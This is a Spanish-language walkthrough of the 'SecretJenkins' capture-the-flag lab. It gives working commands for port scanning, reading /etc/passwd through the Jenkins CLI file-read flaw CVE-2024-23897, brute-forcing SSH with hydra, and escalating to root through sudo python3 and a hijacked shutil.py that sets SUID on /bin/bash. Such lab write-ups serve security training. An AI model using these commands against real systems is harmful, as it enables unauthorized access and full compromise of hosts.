- Tags: #SecretJenkings
---
[Maquina SecretJenkins](https://mega.nz/file/wbEwUBRY#z7bH1Hj9-6tsD2G0ji0tBujUbFaE7w8W3YhvV0MpMQs) ==> Enlace de descarga al laboratorio
```bash
7z x secretjenkins.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh secretjenkins.tar # Desplegamos el laboratorio
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del Target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectiviada con el target
wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina Linux
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconcomiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos.
scanerTCPV2.py -t 172.17.0.2 -p 1-10000 # Asi mismo nuestra herramienta nos
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p22,8080 172.17.0.2 -oN targeted # Realizamos un escaneo para determinar el servicio y la version que corren detrras de estos puertos.
```

**( 22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) )** ==> Tenemos el servicio ssh expuesto.
**( 8080/tcp open  http    Jetty 10.0.18 )** ==> Tenemos este servicio expuesto. El servicio Jetty en el puerto 8080 ==es un servidor web y contenedor de servlets de código abierto, que se usa comúnmente para alojar aplicaciones web en el ecosistema Java==. Este puerto es el predeterminado para Jetty, y se usa para acceder a las aplicaciones web en el local, por ejemplo, a través de la URL `http://localhost:8080`

#### Fase Reconocimiento Web:
```bash
nmap --script http-enum -p8080 172.17.0.2 # Lanzamos el script para enumeracion de nmap, 
# Potenciales archivos.
/robots.txt: Robots file
/api/: Potentially interesting folder
/secured/: Potentially interesting folder (401 Unauthorized)
```

[Exploit Jenkins](https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897) ==> Tenemos un potencial exploit para abusar de este servicio
```bash
http://172.17.0.2:8080/jnlpJars/jenkins-cli.jar # Descargamos el cliente desde la url
java -jar jenkins-cli.jar -s http://172.17.0.2:8080/ -http connect-node "@/etc/passwd" # Una ves descargado ya podemos usarlo para listar archivos del sistema. 
# Tenemos dos usuarios a los cuales realizaremos fuerza bruta para encontrar sus credenciales con nmap o hydra..
pinguinito 
bobby
```

```bash
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
-------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: bobby   password: chocolate # Obtuvimos la credencial del usuario bobby
```

#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh bobby@172.17.0.2 # Proporcionamos la password: ( chocolate )
```

#### Fase Escalada Privilegios
```bash
sudo -l
User bobby may run the following commands on cf63927f9f8e:
    (pinguinito) NOPASSWD: /usr/bin/python3

 sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/bash")' # Migramos de usuario.
```

```bash
 sudo -l 
 User pinguinito may run the following commands on cf63927f9f8e:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py # Tenemos una via potencial de elevar privilegios de root.

/opt/script.py # Tenemos este script que utiliza la libreria ( shutil ) la cual tendremos que secuestrar
/opt # Aqui crearemos un script ( shutil.py ) para que cuando se ejecute el script tome primero el que nosotros creamos
export PATH=:/opt$PATH # Modificamos el path para que sea buscado primero en /opt
touch shutil.py
chmod +x shutil.py
echo 'import os; os.system("chmod u+s /bin/bash")' > shutil.py

sudo -u root /usr/bin/python3 /opt/script.py # Ejecutamos el script como root.

ls -l /bin/bash # Logramos cambiar los permiso de la bash.,
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash

bash -p # Obtendremos una shell como root.
```